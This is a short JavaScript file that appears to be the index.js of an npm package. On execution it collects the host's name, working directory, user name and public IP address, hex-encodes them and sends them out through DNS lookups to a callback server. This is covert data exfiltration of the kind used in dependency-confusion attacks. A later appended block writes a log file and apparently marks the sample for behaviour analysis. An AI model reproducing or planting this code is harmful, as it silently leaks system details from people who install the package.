
// === Begin index.js ===
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});


// === End index.js ===

// === Auto Appended Behavior Injection ===
try {
  const fs = require('fs');
  fs.writeFileSync('dynamic_log.txt', 'Triggered dynamic API');
  console.log('[Dynamic] fs.writeFileSync called');
} catch (e) {
  console.error('[Dynamic] Injection failed:', e);
}
